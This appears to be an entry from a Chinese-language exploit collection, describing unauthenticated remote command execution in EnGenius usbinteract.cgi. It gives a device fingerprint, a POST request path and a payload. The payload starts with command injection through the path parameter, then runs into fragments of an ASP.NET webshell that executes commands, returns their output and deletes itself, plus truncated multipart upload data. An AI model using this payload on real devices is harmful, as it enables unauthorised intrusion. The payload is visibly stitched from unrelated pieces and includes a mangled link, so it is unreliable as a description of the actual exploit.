# EnGeniususbinteract.cgi存在未授权远程命令执行

- **系统**：EnGeniususbinteract　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="/web/images/guest.png"`
- **请求**：`POST /web/cgi-bin/usbinteract.cgi HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
action=7&path="id"e.Start();
out=e.StandardOutput;
EI=e.StandardError;
e.Close();
Response.Write(out.ReadToEnd() + EI.ReadToEnd());
[http://System.IO.File.Delete(Request.PhysicalPath);](http://System.IO.File.Delete(Request.PhysicalPath);)
Response.End();%>
------geckoformboundary787f61f28ad8b037c0c81d8883ef3b37
Content-Disposition: form-data; name="UploadBtn"
上传文件
------geckoformboundary787f61f28ad8b037c0c81d8883ef3b37
Content-Disposition: form-data; name="NewFileText"
------geckoformboundary787f61f28ad8b037c0c81d8883ef3b37
Content-Disposition: form-data; name="NewFolderText"
------geckoformbo…（脚本共 746 字，完整版见原文）
```
- **预期**：200　|　—